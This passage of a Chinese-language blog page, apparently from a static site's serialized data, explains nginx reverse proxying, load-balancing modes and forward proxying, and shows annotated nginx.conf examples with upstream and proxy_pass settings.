shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"nginx-conf配置\"><a href=\"#nginx-conf配置\" class=\"headerlink\" title=\"nginx.conf配置\"></a>nginx.conf配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#user  nobody;</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #在http&#123;&#125;内配置</span><br><span class=\"line\">    #自己进行负载均衡配置，weight为权重</span><br><span class=\"line\">    upstream sms&#123;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        server ip:port weight=1;</span><br><span class=\"line\">        #保证收发都是同一个连接</span><br><span class=\"line\">        ip_hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    upstream xxx&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #配置自己的转发,在server&#123;&#125;内配置</span><br><span class=\"line\">          #过来的url</span><br><span class=\"line\">          location /smsCollection/ &#123;</span><br><span class=\"line\">              #转发的url</span><br><span class=\"line\">              proxy_pass http://sms;</span><br><span class=\"line\">              proxy_set_header    REMOTE-HOST $remote_addr;</span><br><span class=\"line\">              proxy_set_header   Host $host:8080;</span><br><span class=\"line\">              proxy_set_header   X-Real-IP $remote_addr;</span><br><span class=\"line\">              proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">              proxy_read_timeout 300s;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          location /SmsUpstream-1.0/sms191 &#123;</span><br><span class=\"line\">              .....</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-nginx大概作用\"><a href=\"#1-nginx大概作用\" class=\"headerlink\" title=\"1.nginx大概作用\"></a>1.nginx大概作用</h4><p>原文链接: <a href=\"https://juejin.im/entry/58afa0975c497d006778502b\" target=\"_blank\" rel=\"noopener\">https://juejin.im/entry/58afa0975c497d006778502b</a><br></p>\n<h6 id=\"1-反向代理\"><a href=\"#1-反向代理\" class=\"headerlink\" title=\"1.反向代理\"></a>1.反向代理</h6><p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。<br></p>\n<h6 id=\"2-负载均衡\"><a href=\"#2-负载均衡\" class=\"headerlink\" title=\"2.负载均衡\"></a>2.负载均衡</h6><p>RR（默认）<br><br>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除<br></p>\n<p>权重<br><br>指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。<br></p>\n<p>ip_hash<br><br>上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题<br></p>\n<h6 id=\"3-http服务器\"><a href=\"#3-http服务器\" class=\"headerlink\" title=\"3.http服务器\"></a>3.http服务器</h6><p>Nginx本身也是一个静态资源的服务器，当只有静态资源的时候，就可以使用Nginx来做服务器，同时现在也很流行动静分离，就可以通过Nginx来实现<br><br>动静分离<br><br>动静分离是让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作，这就是网站静态化处理的核心思路<br></p>\n<h6 id=\"4-正向代理\"><a href=\"#4-正向代理\" class=\"headerlink\" title=\"4.正向代理\"></a>4.正向代理</h6><p>正向代理，意思是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。当你需要把你的服务器作为代理服务器的时候，可以用Nginx来实现正向代理。<br></p>\n<p>问题： 正向反向的区别是部署在客户端还是服务端？？？？<br></p>\n<p>2019/7/18添加: <br><br>现在，我理解的正向代理与反向代理的区别是:正向代理是将请求代理出去，反代理是将请求代理进来<br></p>\n<ul>\n<li>正向</li>\n</ul>\n<p>通常用来访问无法访问的资源,如google。<br><br>例如 vpn 。client 访问代理(vpn),代理去 <strong> 帮你访问 </strong>client想要的资源，然后返回回来. 其中，有个特点，正向代理需要提前设置一些东西，例如vpn的配置信息.</p>\n<ul>\n<li>反向</li>\n</ul>\n<p>通常用来负载均衡，和保证内网安全.<br><br>客户端是 <strong>无感知 </strong>代理的存在的，反向代理对外都是透明的，访问者者并不知道自己访问的是一个代理。因为客户端不需要任何配置就可以访问。<br><br>反向，实际是代理服务器来接受请求，然后将请求转发给内部网络上的服务器(转发时可以实现负载均衡)，并将从服务器上得到的结果返回客户端，此时代理服务器对外就表现为一个服务器。</p>\n<h5 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h5><p>ngginx可以热部署<br><br>nginx -s reload<br><br>nginx.exe -s reload</p>\n<h4 id=\"nginx-conf默认配置\"><a href=\"#nginx-conf默认配置\" class=\"headerlink\" title=\"nginx.conf默认配置\"></a>nginx.conf默认配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#定义Nginx运行的用户和用户组</span><br><span class=\"line\">#user  nobody;</span><br><span class=\"line\">#nginx进程数，建议设置为等于CPU总核心数。</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]</span><br><span class=\"line\">#error_log  logs/error.log;</span><br><span class=\"line\">#error_log  logs/error.log  notice;</span><br><span class=\"line\">#error_log  logs/error.log  info;</span><br><span class=\"line\"></span><br><span class=\"line\">#进程文件</span><br><span class=\"line\">#pid        logs/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#工作模式与连接数上限</span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">   #单个进程最大连接数（最大连接数=连接数*进程数）</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#设定http服务器</span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">   #文件扩展名与文件类型映射表</span><br><span class=\"line\">    include       mime.types;</span><br><span class=\"line\">    #默认文件类型</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class=\"line\">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class=\"line\">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">    #access_log  logs/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，</span><br><span class=\"line\">    # 如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。</span><br><span class=\"line\">    # 注意：如果图片显示不正常把这个改 成off。</span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #防止网络阻塞</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #长连接超时时间，单位是秒</span><br><span class=\"line\">    #keepalive_timeout  0;</span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #开启gzip压缩输出</span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #虚拟主机的配置</span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        #监听端口</span><br><span class=\"line\">        listen       80;</span><br><span class=\"line\">        #域名可以有多个，用空格隔开</span><br><span class=\"line\">        server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        #默认编码</span><br><span class=\"line\">        #charset koi8-r;</span><br><span class=\"line\"></span><br><span class=\"line\">        #定义本虚拟主机的访问日志</span><br><span class=\"line\">        #access_log  logs/host.access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">            index  index.html index.htm;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        #error_page  404              /404.html;</span><br><span class=\"line\"></span><br><span class=\"line\">        # redirect server error pages to the static page /50x.html</span><br><span class=\"line\">        #</span><br><span class=\"line\">        error_page   500 502 503 504  /50x.html;</span><br><span class=\"line\">        location = /50x.html &#123;</span><br><span class=\"line\">            root   html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    proxy_pass   http://127.0.0.1;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ \\.php$ &#123;</span><br><span class=\"line\">        #    root           html;</span><br><span class=\"line\">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class=\"line\">        #    fastcgi_index  index.php;</span><br><span class=\"line\">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class=\"line\">        #    include        fastcgi_params;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class=\"line\">        # concurs with nginx&apos;s one</span><br><span class=\"line\">        #</span><br><span class=\"line\">        #location ~ /\\.ht &#123;</span><br><span class=\"line\">        #    deny  all;</span><br><span class=\"line\">        #&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       8000;</span><br><span class=\"line\">    #    listen       somename:8080;</span><br><span class=\"line\">    #    server_name  somename  alias  another.alias;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    # HTTPS server</span><br><span class=\"line\">    #</span><br><span class=\"line\">    #server &#123;</span><br><span class=\"line\">    #    listen       443 ssl;</span><br><span class=\"line\">    #    server_name  localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_certificate      cert.pem;</span><br><span class=\"line\">    #    ssl_certificate_key  cert.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class=\"line\">    #    ssl_session_timeout  5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    #    ssl_prefer_server_ciphers  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    #    location / &#123;</span><br><span class=\"line\">    #        root   html;</span><br><span class=\"line\">    #        index  index.html index.htm;</span><br><span class=\"line\">    #    &#125;</span><br><span class=\"line\">    #&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"nginx-conf配置\"><a href=\"#nginx-conf配置\" class=\"headerlink\" title=\"nginx.conf配置\"></a>nginx.conf配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#user  nobody;</span><br><span class=\"line\">worker_processes  1;</span><br><span 